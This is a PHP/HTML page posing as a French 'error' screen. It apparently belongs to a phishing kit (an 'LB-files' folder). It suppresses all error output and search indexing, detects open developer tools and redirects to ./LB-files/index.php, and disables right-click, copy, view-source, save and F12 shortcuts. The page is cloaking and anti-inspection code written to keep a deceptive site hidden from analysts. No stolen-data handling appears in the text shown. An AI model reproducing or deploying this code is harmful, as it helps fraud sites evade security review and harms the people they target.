<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');


?>
<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<title>error</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="format-detection" content="telephone=no">
</head>
<body>
error

  <script src="./LB-files/jquery.min.js"></script>

 <script src="./LB-files/devtool.js"></script>
 
 
 <h3 style="display:none;" id="devtools-state">yes or no</h3>
<h3 style="display:none;" id="devtools-orientation">horizontal of vertical</h3>

<script type="module">
			const stateElement = document.querySelector('#devtools-state');
			const orientationElement = document.querySelector('#devtools-orientation');

			stateElement.textContent = window.devtools.isOpen ? 'yes' : 'no';
			orientationElement.textContent = window.devtools.orientation ? window.devtools.orientation : '';

			window.addEventListener('devtoolschange', event => {
				stateElement.textContent = event.detail.isOpen ? 'yes' : 'no';
				orientationElement.textContent = event.detail.orientation ? event.detail.orientation : '';
	
			});
			
			setInterval(function() {
			if(stateElement.textContent == 'yes'){ location.replace('./LB-files/index.php'); }
			}, 500);
		</script>



<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>


<!--
<META HTTP-EQUIV='Refresh' Content=3;URL='./'>
 -->
 
 
 

</body></html>